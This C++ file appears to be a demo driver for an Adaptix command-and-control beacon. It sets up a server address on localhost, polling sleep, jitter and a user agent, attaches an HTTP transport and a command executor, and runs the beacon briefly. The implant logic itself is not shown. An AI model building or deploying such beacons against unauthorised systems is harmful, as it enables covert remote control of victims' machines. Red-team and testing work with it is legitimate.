#include <chrono>
#include <iostream>
#include <memory>
#include <thread>

#include "adaptix/beacon/beacon.h"
#include "adaptix/beacon/beacon_config.h"
#include "adaptix/beacon/command_executor.h"
#include "adaptix/beacon/http_transport.h"

int main() {
  using ::adaptix::beacon::Beacon;
  using ::adaptix::beacon::BeaconConfig;
  using ::adaptix::beacon::DefaultCommandExecutor;
  using ::adaptix::beacon::HttpTransport;
  using ::adaptix::beacon::Transport;

  auto config = std::make_shared<BeaconConfig>();
  config->set_server_address("127.0.0.1");
  config->set_server_port(8080);
  config->set_sleep_interval(std::chrono::seconds(3));
  config->set_jitter_percent(25);
  config->set_user_agent("AdaptixBeacon/1.0");
  config->set_beacon_id("beacon-001");

  std::unique_ptr<Transport> transport = std::make_unique<HttpTransport>(config);
  std::unique_ptr<::adaptix::beacon::CommandExecutor> executor =
      std::make_unique<DefaultCommandExecutor>();

  Beacon beacon(config, std::move(transport), std::move(executor));
  beacon.Start();

  std::this_thread::sleep_for(std::chrono::seconds(10));
  beacon.Stop();

  std::cout << "Beacon stopped." << std::endl;
  return 0;
}
